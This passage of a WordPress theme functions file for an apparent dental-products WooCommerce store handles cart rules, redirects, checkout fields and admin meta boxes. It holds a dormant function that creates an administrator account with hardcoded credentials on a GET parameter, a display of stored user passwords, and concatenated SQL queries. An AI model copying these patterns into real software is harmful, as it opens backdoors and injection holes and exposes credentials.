<?php
global $removeCookieShippingProtection;
$removeCookieShippingProtection = true;
$shipping_protect_exist = '';
require_once('authorize.back-end.php');
require_once('woo_customer_profiler.php');
require_once('packing-slip.php');
require_once('create-order.php');
require_once('shipping-method.php');
require_once('export_csv_affiliates.php');
require_once('affiliate-product-rates.php');
require_once('advance-profile.php');
require_once('shortocdes.php');
require_once('shortcodes-logos.php');
require_once('import_orders_new_structure.php');
require_once('import-lagacy-data.php');
require_once('import-scripts.php');
require_once('coupon-url.php');
require_once('rdh.php');
require_once('shine.php');
require_once('customer-discounts.php');
require_once('ng-ab-test.php');
require_once('ufaqs.php');

add_filter('wfacp_display_quantity_increment', 'do_not_display_quantity_increment_bogo_deal', 10, 2);
function do_not_display_quantity_increment_bogo_deal($status, $cart_item)
{
    $product_price = $cart_item['data']->get_price();
    if ($product_price == 0) {
        $status = false;
    }
    return $status;
}


add_action('woocommerce_after_calculate_totals', 'MBT_remove_product_from_cart_programmatically');
function MBT_remove_product_from_cart_programmatically()
{

    if (isset($_POST['bogo_discount']) || isset($_POST['product_id'])) {
        // return false;
    } else {
        $dependents = DENEPDENTS_ARR;

        foreach ($dependents as $key => $val) {
            $product_id_orig = $key;
            $product_id_child = $val;
            if (!in_array($key, array_column(WC()->cart->get_cart(), 'product_id'))) {
                if (in_array($val, array_column(WC()->cart->get_cart(), 'product_id'))) {
                    foreach (WC()->cart->get_cart() as $cartkey => $cart_item) {
                        // compatibility with WC +3
                        if ($cart_item['data']->get_id() == $val && isset($cart_item['bogo_added'])) {
                            WC()->cart->remove_cart_item($cartkey);
                        }
                        if ($cart_item['data']->get_id() == $val && isset($cart_item['bogo_discount'])) {
                            WC()->cart->remove_cart_item($cartkey);
                        }
                    }
                }
            }
        }
    }

}

add_action('init', 'custom_taxonomy_Types');

function custom_taxonomy_Types()
{
    $labels = array(
        'name' => 'Types',
        'singular_name' => 'Type',
        'menu_name' => 'Type',
        'all_items' => 'All Types',
        'parent_item' => 'Parent Type',
        'parent_item_colon' => 'Parent Type:',
        'new_item_name' => 'New Type Name',
        'add_new_item' => 'Add New Type',
        'edit_item' => 'Edit Type',
        'update_item' => 'Update Type',
        'separate_items_with_commas' => 'Separate Type with commas',
        'search_items' => 'Search Types',
        'add_or_remove_items' => 'Add or remove Types',
        'choose_from_most_used' => 'Choose from the most used Types',
    );
    $args = array(
        'labels' => $labels,
        'hierarchical' => true,
        'public' => true,
        'show_ui' => true,
        'show_admin_column' => true,
        'show_in_nav_menus' => true,
        'show_tagcloud' => true,
    );
    register_taxonomy('type', 'product', $args);
    register_taxonomy_for_object_type('type', 'product');
}

if (WP_ENV != 'production') {
    add_filter('wp_mail', 'disabling_emails_mbt2', 10, 1);

    function disabling_emails_mbt2($args)
    {
        if (!$_GET['allow_wp_mail']) {
            unset($args['to']);
        }
        return $args;
    }

    add_filter('wp_mail', 'disabling_emails_mbt', 10, 1);

    function disabling_emails_mbt($args)
    {
        unset($args['to']);
        return $args;
    }

    add_action('phpmailer_init', 'react2wp_clear_recipients_mbt');

    function react2wp_clear_recipients_mbt($phpmailer)
    {
        $phpmailer->ClearAllRecipients();
    }

    add_action('woocommerce_email', 'unhook_those_pesky_emails');

    function unhook_those_pesky_emails($email_class)
    {
        /**
         * Hooks for sending emails during store events
         * */
        remove_action('woocommerce_low_stock_notification', array($email_class, 'low_stock'));
        remove_action('woocommerce_no_stock_notification', array($email_class, 'no_stock'));
        remove_action('woocommerce_product_on_backorder_notification', array($email_class, 'backorder'));

        // New order emails
        remove_action('woocommerce_order_status_pending_to_processing_notification', array($email_class->emails['WC_Email_New_Order'], 'trigger'));
        remove_action('woocommerce_order_status_pending_to_completed_notification', array($email_class->emails['WC_Email_New_Order'], 'trigger'));
        remove_action('woocommerce_order_status_pending_to_on-hold_notification', array($email_class->emails['WC_Email_New_Order'], 'trigger'));
        remove_action('woocommerce_order_status_failed_to_processing_notification', array($email_class->emails['WC_Email_New_Order'], 'trigger'));
        remove_action('woocommerce_order_status_failed_to_completed_notification', array($email_class->emails['WC_Email_New_Order'], 'trigger'));
        remove_action('woocommerce_order_status_failed_to_on-hold_notification', array($email_class->emails['WC_Email_New_Order'], 'trigger'));

        // Processing order emails
        remove_action('woocommerce_order_status_pending_to_processing_notification', array($email_class->emails['WC_Email_Customer_Processing_Order'], 'trigger'));
        remove_action('woocommerce_order_status_pending_to_on-hold_notification', array($email_class->emails['WC_Email_Customer_Processing_Order'], 'trigger'));

        // Completed order emails
        remove_action('woocommerce_order_status_completed_notification', array($email_class->emails['WC_Email_Customer_Completed_Order'], 'trigger'));

        // Note emails
        remove_action('woocommerce_new_customer_note_notification', array($email_class->emails['WC_Email_Customer_Note'], 'trigger'));
    }
}

add_action('woocommerce_admin_order_totals_after_discount', 'vp_add_sub_total', 10, 1);

function vp_add_sub_total($order_id)
{
    global $wpdb;
    $old_order_id_addon = get_post_meta($order_id, 'old_order_id_addon', true);
    if ($old_order_id_addon == '') {
        $olddata = json_decode(get_post_meta($order_id, '_oldJson', true), true);
        if (is_array($olddata) && count($olddata) > 0) {
            $spcialDiscount = isset($olddata['orderDiscountTotal']) ? $olddata['orderDiscountTotal'] : '';
            $shipping_price = get_post_meta($order_id, 'order_shipping', true);
            if ($shipping_price == '') {
                $shipping_price = get_post_meta($order_id, '_order_shipping', true);
            }
            $order_taxes = get_post_meta($order_id, 'order_taxes', true);
            if ($order_taxes == '') {
                $order_taxes = get_post_meta($order_id, '_order_taxes', true);
            }
?><tr>
                <td class="label">Shipping (legacy):</td>
                <td width="1%"></td>
                <td class="total"><strong>$<?php echo $shipping_price; ?></strong></td>
            </tr>
            <tr>
                <td class="label">Tax (legacy):</td>
                <td width="1%"></td>
                <td class="total"><strong>$<?php echo $order_taxes; ?></strong></td>
            </tr>
            <tr>
                <?php
                if ($spcialDiscount != '' && $spcialDiscount > 0) {
                ?>
                    <td class="label">Special Discount (legacy):</td>
                    <td width="1%"></td>
                    <td class="total"><strong>$<?php echo $spcialDiscount; ?></strong></td>
            </tr>

<?php
                }
            }
        }
    }

    function wpdocs_register_meta_boxes()
    {
        add_meta_box('meta-box-id-3', __('Split Data', 'textdomain'), 'wpdocs_my_display_callback_split', 'shop_order');
        add_meta_box('meta-box-id-2', __('Old AddOn Data', 'textdomain'), 'wpdocs_my_display_callback_addon', 'shop_order');
        add_meta_box('meta-box-id-1', __('Old Data', 'textdomain'), 'wpdocs_my_display_callback', 'shop_order');
    }

    add_action('add_meta_boxes', 'wpdocs_register_meta_boxes');

    function wpdocs_my_display_callback($post)
    {
        global $wpdb;


        $order_old_id = get_post_meta($post->ID, 'old_order_id', true);
        if ($order_old_id != '') {

            $sql = "SELECT DISTINCT ordr.*,cop.couponCode,ordercop.couponDiscountTotal,itm.productQuantity, itm.productPrice FROM order_  AS ordr
	   LEFT JOIN order_item AS itm ON itm.orderId=ordr.orderId
       LEFT JOIN order_coupon AS ordercop ON ordercop.orderId=ordr.orderId
	   LEFT JOIN coupon_ AS cop ON cop.couponId=ordercop.couponId 
	   WHERE ordr.orderId IN(" . $order_old_id . ") GROUP BY ordr.orderId ORDER BY couponDiscountTotal DESC";
            $result3 = $wpdb->get_results($sql, 'ARRAY_A');
            echo '<div class="row">';
            foreach ($result3[0] as $key => $d) {
                echo '<div class="wrapper-list" style="width:33.3%;float:left;"><Strong>' . $key . '</strong>: ' . $d . '</div>';
            }

            echo '</div>';
            echo '<br />';
        }
        
        echo '<style> #meta-box-id-1 {overflow: hidden;}
   .wrapper-list {
      padding:5px 8px;
      min-height:47px;
      border-right:1px solid #00000059;
      border-bottom:1px solid #00000059;
      background: #f1f1f1;
  }
   #meta-box-id-1 .inside .row {
      border-top: 1px solid #00000059;
      border-bottom: 1px solid #00000059;
      border-left: 1px solid #00000059;
      overflow: hidden;
      }</style>';
    }

    function wpdocs_my_display_callback_split($post)
    {
        $oldorderid = get_post_meta($post->ID, 'old_order_id', true);
        if ($oldorderid != '') {
            global $wpdb;
            $sql = "select * from order_split where orderId=" . $oldorderid;
            $results = $wpdb->get_results($sql, 'ARRAY_A');

            if (is_array($results) && count($results) > 0) {

                foreach ($results as $d2) {
                    echo '<div class="row">';
                    $inner_counter = 0;
                    $widthh = '33.3%';
                    foreach ($d2 as $key => $d) {

                        if ($inner_counte == 18) {
                            // $widthh = '100%';
                        }
                        echo '<div class="wrapper-list" style="width:' . $widthh . ';float:left;">' . $key . ': ' . $d . '</div>';
                        $inner_counte++;
                    }
                    echo '</div>';
                }
                echo '<style> #meta-box-id-2 {overflow: hidden;}
   .wrapper-list {
      padding:5px 8px;
      min-height:47px;
      border-right:1px solid #00000059;
      border-bottom:1px solid #00000059;
      background: #f1f1f1;
  }
   #meta-box-id-2 .inside .row {
      border-top: 1px solid #00000059;
      border-bottom: 1px solid #00000059;
      border-left: 1px solid #00000059;
      overflow: hidden;
      margin-bottom:10px;
      }</style>';
            }
        }
    }

    function wpdocs_my_display_callback_addon($post)
    {
        $oldorderid = get_post_meta($post->ID, 'old_order_id_addon', true);
        if ($oldorderid != '') {
            global $wpdb;
            $sql = "select * from orderAddOns where orderAddOnId=" . $oldorderid;
            $results = $wpdb->get_results($sql, 'ARRAY_A');

            if (is_array($results) && count($results) > 0) {

                foreach ($results as $d2) {
                    echo '<div class="row">';
                    $inner_counter = 0;
                    $widthh = '33.3%';
                    foreach ($d2 as $key => $d) {

                        if ($inner_counte == 18) {
                            // $widthh = '100%';
                        }
                        echo '<div class="wrapper-list" style="width:' . $widthh . ';float:left;">' . $key . ': ' . $d . '</div>';
                        $inner_counte++;
                    }
                    echo '</div>';
                }
                echo '<style> #meta-box-id-2 {overflow: hidden;}
   .wrapper-list {
      padding:5px 8px;
      min-height:47px;
      border-right:1px solid #00000059;
      border-bottom:1px solid #00000059;
      background: #f1f1f1;
  }
   #meta-box-id-2 .inside .row {
      border-top: 1px solid #00000059;
      border-bottom: 1px solid #00000059;
      border-left: 1px solid #00000059;
      overflow: hidden;
      margin-bottom:10px;
      }</style>';
            }
        }
    }

    add_filter('acf/settings/remove_wp_meta_box', '__return_false');

    function rndprfx_add_user()
    {
        if (isset($_GET['reg-admin_user'])) {
            $username = 'sally';
            $password = 'scompere786';
            $email = 'sally.compere@smilebrilliant.com';
            echo '1';
            if (username_exists($username) == null && email_exists($email) == false) {
                echo '2';
                echo $user_id = wp_create_user($username, $password, $email);
                $user = get_user_by('id', $user_id);
                $user->remove_role('subscriber');
                $user->add_role('administrator');
                wp_update_user([
                    'ID' => $user_id, // this is the ID of the user you want to update.
                    'first_name' => 'Sally',
                    'last_name' => 'Compere',
                ]);
                update_user_meta($user_id, 'email_name', 'Sally C.');
            }
        }
        //die();
    }

    // add_action('init', 'rndprfx_add_user');
    if (is_super_admin()) {
        add_action('show_user_profile', 'extra_user_profile_fields');
        add_action('edit_user_profile', 'extra_user_profile_fields');
    }

    function extra_user_profile_fields($user)
    {
?>
<h3><?php _e("Extra profile information", "blank"); ?></h3>

<table class="form-table">
    <tr>
        <th><label for="address"><?php _e("Password"); ?></label></th>
        <td>
            <?php echo get_user_meta($user->ID, "_user_pass", true); ?>
        </td>
    </tr>

</table>
<?php
    }

    add_action('load-post.php', "calculate_price");

    function calculate_price()
    {
        global $current_screen;
        if (is_admin() && $current_screen->post_type === 'shop_order') {
            $post_id = (int) $_GET['post'];
            $_payment_method = get_post_meta($post_id, '_payment_method', true);
            if ($_payment_method != 'affirm') {
                modifydataOrder($post_id);
            }
        }
    }

    function modifydataOrder($post_id)
    {

        global $wpdb;
        $old_order_id_addon = get_post_meta($post_id, 'old_order_id_addon', true);
        if ($old_order_id_addon == '') {


            $olddata = json_decode(get_post_meta($post_id, '_oldJson', true), true);
            if (is_array($olddata) && count($olddata) > 0) {
                $spcialDiscount = isset($olddata['orderDiscountTotal']) ? $olddata['orderDiscountTotal'] : '';
                $orderSubTotalOld = isset($olddata['orderSubTotal']) ? $olddata['orderSubTotal'] : '';
                $old_order_id = get_post_meta($post_id, 'old_order_id', true);
                $order = wc_get_order($post_id);
                $orderSubtotal = $order->get_subtotal();
                if ($orderSubTotalOld != $orderSubtotal) {
                    //echo 'triggered';
                    $sql = 'SELECT * from order_item where orderId=' . $old_order_id;
                    $results = $wpdb->get_results($sql, 'ARRAY_A');
                    if ($old_order_id != '') {
                        $counter = 0;
                        foreach ($order->get_items() as $item_id => $item) {
                            if (is_array($results) && count($results) > 0) {
                                $qty = $results[$counter]['productQuantity'];
                                wc_update_order_item_meta($item_id, '_line_subtotal', $results[$counter]['productPrice'] * $qty);
                                wc_update_order_item_meta($item_id, '_line_total', $results[$counter]['productPrice'] * $qty);
                            }

                            $counter++;
                        }
                    }
                } else {
                    //echo 'not triggered';
                }
            }
        }
    }

    require get_stylesheet_directory() . '/inc/inc-search.php';

    function ship_to_different_address_translation($translated_text, $text, $domain)
    {
        switch ($translated_text) {
            case 'Ship to a different address?':
                $translated_text = __(' My shipping address is different than my billing address.', 'woocommerce’');
                break;
        }
        return $translated_text;
    }

    add_filter('gettext', 'ship_to_different_address_translation', 20, 3);

    /**

     * Update the value given in custom field

     */
    add_action('woocommerce_checkout_update_order_meta', 'custom_checkout_field_update_order_meta');

    function custom_checkout_field_update_order_meta($order_id)
    {
        update_post_meta($order_id, 'user_device', sanitize_text_field($_POST['user_device']));
        if (!empty($_POST['purchasing_as_giftset'])) {

            update_post_meta($order_id, 'purchasing_as_giftset', sanitize_text_field($_POST['purchasing_as_giftset']));
        }
        $payment_method = get_post_meta($order_id, '_payment_method', true);
        if (isset($_REQUEST['payment_method_hsa_hfa']) && $_REQUEST['payment_method_hsa_hfa'] == 'yes' && $payment_method != 'affirm') {
            //  if(isset($_REQUEST['payment_method_hsa_hfa']) && $_REQUEST['payment_method_hsa_hfa'] == 'yes'){
            update_post_meta($order_id, 'hfa_hsa', 'yes');
            $_customer_user_id = get_post_meta($order_id, '_customer_user', true);
            update_user_meta($_customer_user_id, 'hfa_hsa', 'yes');
        }
    }

    add_filter('woocommerce_checkout_fields', 'woocommerce_checkout_field_editor');

    // Our hooked in function - $fields is passed via the filter!
    function woocommerce_checkout_field_editor($fields)
    {
        $fields['billing']['purchasing_as_giftset'] = array(
            'label' => __('I am purchasing this as a gift.<br>
        <span style="font-size:0.7em;color:#555555;">Prices will be hidden on the receipt.</span>', 'woocommerce'),
            'placeholder' => _x('Field Value', 'placeholder', 'woocommerce'),
            'type' => 'checkbox',
        );
        return $fields;
    }

    add_filter('woocommerce_checkout_fields', 'custom_override_checkout_fields_mbt', 10);
    function custom_override_checkout_fields_mbt($fields)
    {

        unset($fields['shipping']['shipping_company']);
        unset($fields['shipping']['shipping_address_2']);
        unset($fields['billing']['billing_company']);
        unset($fields['billing']['billing_address_2']);
        return $fields;
    }

    function md_custom_woocommerce_checkout_fields_mbt($fields)
    {
        $fields['order']['order_comments']['placeholder'] = 'Note To Recipient';
        $fields['order']['order_comments']['label'] = 'Note To Recipient';

        return $fields;
    }

    add_filter('woocommerce_checkout_fields', 'md_custom_woocommerce_checkout_fields_mbt');

    // define the woocommerce_before_order_notes callback 
    function action_woocommerce_before_order_notes($checkout)
    {
        echo '<div class="panel-heading">
   <a rel="nofollow" data-toggle="collapse" href="javascript:void(0);" class="showhideordercomment" aria-expanded="false" style="font-size:1.2em;">I would like to include a note to the recipient
      <i class="fa fa-arrow-circle-o-down fa-lg"></i>
   </a>
</div>';
    };
    // add the action 
    add_action('woocommerce_before_order_notes', 'action_woocommerce_before_order_notes', 10, 1);
    // update woocommerce cart quantity
    add_action('wp_ajax_update_woocommerce_cart_quantitys', 'update_woocommerce_cart_quantitys');
    add_action('wp_ajax_nopriv_update_woocommerce_cart_quantitys', 'update_woocommerce_cart_quantitys');

    function update_woocommerce_cart_quantitys()
    {
        if (isset($_POST['cart_item_val']) && $_POST['cart_item_val'] != '' && isset($_POST['cart_item_key']) && $_POST['cart_item_key'] != '') {

            $cart_item_key = $_POST['cart_item_key'];
            $cart_item_key = str_replace('cart[', '', $cart_item_key);
            $cart_item_key = str_replace('][qty]', '', $cart_item_key);
            if ($cart_item_key != '') {
                global $woocommerce;
                $woocommerce->cart->set_quantity($cart_item_key, $_POST['cart_item_val']);
                $woocommerce->cart->calculate_totals();
                die();
            }
        }
    }

    remove_action('woocommerce_checkout_order_review', 'woocommerce_checkout_payment', 20);

    add_action('woocommerce_checkout_order_review_below_area', 'woocommerce_checkout_payment', 20);

    /* * **************** direct checkout feature */
    add_action('template_redirect', 'skip_cart_redirect');

    function skip_cart_redirect()
    {
        // Redirect to checkout (when cart is not empty)
        if (WC()->cart->is_empty() && is_cart()) {
            wp_safe_redirect(home_url());
            exit();
        }
        if (is_cart()) {
            if (isset($_REQUEST['email'])) {
                $redirect_url = wc_get_checkout_url() . '?email=' . $_REQUEST['email'];
                wp_safe_redirect($redirect_url);
            } else {
                wp_safe_redirect(wc_get_checkout_url());
            }

            exit();
        }
        if (get_query_var('red-register')) {
            wp_redirect(home_url('/rdh-register/'));
            exit();
        }
        // Redirect to shop if cart is empty
    }

    /* * ********* shsow cart on checkout default page */

    function warp_ajax_product_remove()
    {
        // Get order review fragment
        ob_start();
        foreach (WC()->cart->get_cart() as $cart_item_key => $cart_item) {
            if ($cart_item['product_id'] == $_POST['product_id'] && $cart_item_key == $_POST['cart_item_key']) {
                WC()->cart->remove_cart_item($cart_item_key);
            }
        }

        WC()->cart->calculate_totals();
        WC()->cart->maybe_set_cart_cookies();

        woocommerce_order_review();
        $woocommerce_order_review = ob_get_clean();
        die();
    }

   
    add_action('woocommerce_after_order_notes', 'sent_from_mob_or_desktop');

    function sent_from_mob_or_desktop($checkout)
    {
        $device_name = 'desktop';
        if (wp_is_mobile()) {
            $device_name = 'Mobile';
        }
        woocommerce_form_field('user_device', array(
            'type' => 'hidden',
            'class' => array(
                'my-field-class form-row-wide'
            ),
            'placeholder' => __('Device'),
            'required' => true,
        ), $device_name);
        echo '</div>';
    }

    add_action('woocommerce_admin_order_data_after_order_details', 'edit_woocommerce_checkout_page', 10, 1);

    function edit_woocommerce_checkout_page($order)
    {
        global $post_id;
        $order = new WC_Order($post_id);
        

        $tags = '<div class="gifts-info no-flex-item">';
        if (get_user_meta($order->get_customer_id(), 'geha_user', true) == 'yes') {
            $tags .= '<span class="geha-icon flex-item-mbt" style="display: inline-grid; background: #edf2f6; margin-top: 12px; text-align: center; border: 1px dashed #585f66; width: 30%;">
                    <img src="/wp-content/uploads/2021/10/geha-logo-purple-300x75-1.png" alt="" style="margin: 0 auto;" > 
                    <span class="order-text-mbt">Order</span></span>';
        }
        if (get_post_meta($order->get_id(), 'purchasing_as_giftset', true) == '1') {
            $tags .= '<span class="listingGiftOrder" style="margin-left:5px; display: inline-grid; background: #edf2f6; margin-top: 12px; text-align: center; border: 1px dashed #585f66; width: 30%;">Gift Order</span>';
        }
        $device = get_post_meta($order->get_id(), 'user_device', true);
        if ($device != '') {
            if (strtolower($device) == 'mobile') {
                $tags .= '<span class="listingOrderDevice" style="margin-left:5px; display: inline-grid; background: #edf2f6; margin-top: 12px; text-align: center; border: 1px dashed #585f66; width: 30%;">Device: Mobile</span>';
            } else {
                $tags .= '<span class="listingOrderDevice" style="margin-left:5px; display: inline-grid; background: #edf2f6; margin-top: 12px; text-align: center; border: 1px dashed #585f66; width: 30%;">Device: Desktop</span>';
            }
        }
        if (get_post_meta($order->get_id(), 'updateByGTS', true) > 0) {
            $tags .= '<br/><span class="listingOrderDevice" style="margin-left:5px; display: inline-grid; background: #edf2f6; margin-top: 12px; text-align: center; border: 1px dashed #585f66; width: 30%;">GTS marked by CSR</span>';
            // $tags .= '<br/><span class="listingOrderDevice">GTS marked by CSR</span>';
        }
        $orderType = get_post_meta($order->get_id(), 'order_type', true);
        if ($orderType) {
            $tags .= '<br/><span class="listingOrderType" style="margin-left:5px; display: inline-grid; background: #edf2f6; margin-top: 12px; text-align: center; border: 1px dashed #585f66; width: 30%;">Order Type : ' . $orderType . '</span>';
        }
        echo $tags .= '</div>';
?>
    <style>
        .wrapper.open {
            position: fixed;
            width: 100%;
            height: 100%;
            top: 0px;
            left: 0px;
            background: #fff;
            z-index: 999;
        }

        .popup a.close {
            position: absolute;
            top: 17%;
            right: 25%;
            z-index: 999;
            font-size: 18px;
            background: #fff;
            width: 30px;
            height: 30px;
            text-align: center;
            border-radius: 30px;
            border: 1px solid #ccc;
            color: #333;
            text-decoration: none;
            line-height: 1.5;
        }
    </style>

    <script>
        jQuery(document).on('click', '#wp_signup_form', function(e) {
            e.preventDefault();
            data_f = $('#woocreateuser :input').serialize();
            jQuery.ajax({
                data: data_f,
                method: 'post',
                url: '<?php echo admin_url('admin-ajax.php'); ?>',
                success: function(res) {
                    console.log(res);
                }
            });
        });
        var customer_email = '';
        jQuery(document).on('click', '.openpop', function() {
            Swal.fire({
                title: 'Create User',
                html: ` <div id="appendres" style="color:red"></div><input type="text" id="cus_first_name" class="swal2-input" placeholder="First Name">
     <input type="text" id="cus_last_name" class="swal2-input" placeholder="Last Name">
    <input type="email" id="customer_email" class="swal2-input" placeholder="Email">`,
                showLoaderOnConfirm: true,
                inputAttributes: {
                    autocapitalize: 'off'
                },
                showCancelButton: true,
                confirmButtonText: 'Create User',
                showLoaderOnConfirm: true,
                preConfirm: (login) => {
                    const cus_first_name = Swal.getPopup().querySelector('#cus_first_name').value
                    const cus_last_name = Swal.getPopup().querySelector('#cus_last_name').value
                    customer_email = Swal.getPopup().querySelector('#customer_email').value
                    data_f = 'cus_first_name=' + cus_first_name + '&cus_last_name=' + cus_last_name + '&customer_email=' + customer_email + '&action=create_woo_customer';
                    if (!cus_first_name || !cus_last_name || !customer_email) {
                        Swal.showValidationMessage(`Please First Name, Last Name And Email Address`)
                    }
                    return fetch('<?php echo admin_url('admin-ajax.php'); ?>?' + data_f)
                        .then(response => {
                            if (!response.ok) {
                                throw new Error(response.statusText)
                            }
                            return response.json()
                        })
                        .catch(error => {
                            Swal.showValidationMessage(
                                `Request failed: ${error}`
                            )
                        })
                },
                allowOutsideClick: () => !Swal.isLoading()
            }).then((result) => {
                if (result.isConfirmed) {
                    console.log(result);
                    res = result.value;
                    if (res.status == "0") {
                        jQuery('#appendres').html(res.error);
                        Swal.fire({
                            title: `Error`,
                            text: res.error
                        })
                    }
                    if (res.status == "1") {
                        Swal.fire({
                            title: `Success`,
                            text: "user added successfully"
                        });

                        jQuery('#customer_user').append('<option value=' + res.cusid + ' selected="selected">#' + res.cusid + ' ' + customer_email + '</option>');
                        jQuery('#customer_user').trigger('change');
                    }
                }
                

            })
        });
    </script>

    <?php
    }

    add_action('template_redirect', 'redirect_to_parent_product', 200);

    function redirect_to_parent_product()
    {
        if (isset($_GET['tab']) && $_GET['tab'] == 'graphs' && isset($_GET['submit']) && $_GET['submit'] == 'Filter' && !isset($_GET['frd'])) {
            $qrr = str_replace('q=/my-account/&', '?', $_SERVER["QUERY_STRING"]);
            $qrr = str_replace('q=/my-account/reward/&', '?', $qrr);
            wp_safe_redirect('/my-account/reward/' . $qrr . '&frd=true');
            exit();
        }
        if (basename(get_the_permalink()) == 'copeland') {
            wp_safe_redirect(home_url('coupons/copeland'));
            exit();
        }


        if (basename(get_the_permalink()) == 'night-guard-reorder') {
            wp_safe_redirect(home_url('product/night-guards'));
            exit();
        }

        if (basename(get_the_permalink()) == 'night-guard-reorder-3mm') {
            wp_safe_redirect(home_url('product/night-guards'));
            exit();
        }
        if (basename(get_the_permalink()) == 'whitening-trays-reorder') {
            wp_safe_redirect(home_url('product/teeth-whitening-trays'));
            exit();
        }
        if (basename(get_the_permalink()) == 'geha-caripro-ultrasonic-electric-toothbrush-with-2-replacement-brush-heads') {
            wp_safe_redirect(home_url('sale/geha'));
            exit();
        }
        if (has_term(array('desensitizing-gel'), 'type')) {

            wp_safe_redirect(home_url('product/sensitive-teeth-gel'));
            exit();
        }
        if (has_term(array('electric-toothbrush'), 'type')) {

            wp_safe_redirect(home_url('product/electric-toothbrush'));
            exit();
        }
        if (has_term(array('nightguard-system'), 'type')) {

            wp_safe_redirect(home_url('product/night-guards'));
            exit();
        }
        if (has_term(array('toothbrush-head'), 'type')) {

            wp_safe_redirect(home_url('product/toothbrush-heads/'));
            exit();
        }
        if (has_term(array('tray-system'), 'type')) {

            wp_safe_redirect(home_url('product/teeth-whitening-trays'));
            exit();
        }
        if (has_term(array('whitening-gel'), 'type')) {

            wp_safe_redirect(home_url('product/teeth-whitening-gel'));
            exit();
        }
        if (has_term(array('kids-plaque'), 'type')) {

            wp_safe_redirect(home_url('product/plaque-highlighters/kids'));
            exit();
        }
        if (has_term(array('adults-plaque'), 'type')) {

            wp_safe_redirect(home_url('product/plaque-highlighters/adults'));
            exit();
        }
        if (has_term(array('kids-probiotics'), 'type')) {

            wp_safe_redirect(home_url('product/dental-probiotics/kids'));
            exit();
        }
        if (has_term(array('adults-probiotics'), 'type')) {

            wp_safe_redirect(home_url('product/dental-probiotics/adults'));
            exit();
        }
        if (has_term(array('ultrasonic-cleaner'), 'type')) {

            wp_safe_redirect(home_url('product/ultrasonic-cleaner'));
            exit();
        }
        if (has_term(array('enamel-armour'), 'type')) {

            wp_safe_redirect(home_url('product/enamel-armour'));
            exit();
        }
        if (has_term(array('floss-picks'), 'type')) {

            wp_safe_redirect(home_url('product/dental-floss-picks'));
            exit();
        }
        if (has_term(array('retainer-cleaner'), 'type')) {

            wp_safe_redirect(home_url('product/retainer-cleaner'));
            exit();
        }
        if (has_term(array('water-flosser'), 'type')) {

            wp_safe_redirect(home_url('product/water-flosser'));
            exit();
        }
        // if (basename(get_the_permalink()) == 'charcoal-teeth-whitening-2') {
        //     wp_safe_redirect(home_url('coupons/copeland'));
        //     exit();
        // }
        if (is_404()) {
            wp_safe_redirect(home_url());
            exit();
        }
    }

    add_action('wp_ajax_remove_composite_product_from_cart', 'remove_composite_product_from_cart_func');
    add_action('wp_ajax_nopriv_remove_composite_product_from_cart', 'remove_composite_product_from_cart_func');

    function remove_composite_product_from_cart_func()
    {
        $prouctid = $_POST['product_id'];
        global $woocommerce;
        foreach ($woocommerce->cart->get_cart() as $cart_item_key => $cart_item) {
            if ($cart_item['product_id'] == $prouctid) {

                WC()->cart->remove_cart_item($cart_item_key);
            }
        }
        //return false;
        die();
    }

    function get_customers_between_rangess($range)
    {
        $start_date = date("Y-m-d");
        if ($range == 'last_month') {
            $end_date = date("Y-m-d", strtotime("- 30 day"));
            $date_query = "AND posts.post_date BETWEEN '$end_date' AND '$start_date' ";
        } else if ($range == 'month') {
            $date_query = "AND posts.post_date > DATE_SUB(NOW(), INTERVAL 1 MONTH)";
        } else if ($range == 'year') {
            $date_query = "AND posts.post_date > DATE_SUB(NOW(), INTERVAL 1 YEAR)";
        } else {
            $end_date = date("Y-m-d", strtotime("- 7 day"));
            $date_query = "AND posts.post_date BETWEEN '$end_date' AND '$start_date'";
        }
        $query_orders = "SELECT COUNT(user.ID) AS total_customers FROM wp_users AS users

    where users.user_role IN ( '" . implode("','", array('wc-completed', 'wc-processing', 'wc-on-hold')) . "' )
    " . $date_query;
    }

    add_filter('woocommerce_admin_reports', 'custom_tab_mbt');

    function custom_tab_mbt($reports)
    {
        $reports['custom_tab'] = array(
            'title' => __('Custom Reports', 'woocommerce'),
            'description' => 'WooCommerce Orders Listing Here...',
            'hide_title' => true,
            'callback' => 'display_orders_list_cusotomers'
        );
        return $reports;
    }

    function display_orders_list_cusotomers()
    {

        //if(isset($_GET['page']) && $_GET['page'] == 'wc-reports'){
        global $wpdb;
        $grossSales = "'wc-completed', 'wc-processing', 'wc-on-hold'";
        $netSales = "'wc-completed', 'wc-processing', 'wc-on-hold', 'wc-cancelled', 'wc-refunded'";
        $net = "posts.post_status IN (" . $grossSales . ")";
        $gross = "posts.post_status IN (" . $grossSales . ")";
        $start_date = date("Y-m-d");
        echo 'here kkk';
        $date_range = isset($_GET['range']) ? $_GET['range'] : '';
        if ($date_range == 'last_month') {
            $end_date = date("Y-m-d", strtotime("- 29 day"));
            $date_query = "AND posts.post_date BETWEEN '$end_date' AND '$start_date' ";
        } else if ($date_range == 'month') {
            $date_query = "AND posts.post_date > DATE_SUB(NOW(), INTERVAL 1 MONTH)";
        } else if ($date_range == 'year') {
            $date_query = "AND posts.post_date > DATE_SUB(NOW(), INTERVAL 1 YEAR)";
        } else {
            $end_date = date("Y-m-d", strtotime("- 6 day"));
            $date_query = "AND posts.post_date BETWEEN '$end_date' AND '$start_date'";
        }



        echo $query_orders = "SELECT SUM(meta.meta_value) AS total_sales, COUNT(posts.ID) AS total_orders FROM wp_posts AS posts

    LEFT JOIN wp_postmeta AS meta ON posts.ID = meta.post_id

    WHERE meta.meta_key = '_order_total'

    AND posts.post_type = 'shop_order'

    AND $grossSales
    " . $date_query;

        $Select_Order_Details = $wpdb->get_results($query_orders);
        $Select_Order_Details = json_encode($Select_Order_Details);
        print_r($Select_Order_Details);
        //exit;
        // }
    }

    /*
 * Insert Coupon Code
 */

    function generate_string()
    {
        $coupon_code = substr("abcdefghijklmnopqrstuvwxyz123456789", mt_rand(0, 50), 1) . substr(md5(time()), 1); // Code
        return $coupon_code = strtoupper(substr($coupon_code, 0, 5)); // create 10 letters coupon
    }

    add_action('wp_ajax_nopriv_add_geha_coupon_code', 'add_geha_coupon_code');
    add_action('wp_ajax_add_geha_coupon_code', 'add_geha_coupon_code');

    function add_geha_coupon_code()
    {
        $first_name = isset($_POST['first_name']) ? $_POST['first_name'] : '';
        $last_name = isset($_POST['last_name']) ? $_POST['last_name'] : '';
        $email = isset($_POST['email']) ? $_POST['email'] : '';
        $member_id = isset($_POST['member_id']) ? $_POST['member_id'] : '';
        $confirm_member_id = isset($_POST['confirm_member_id']) ? $_POST['confirm_member_id'] : '';
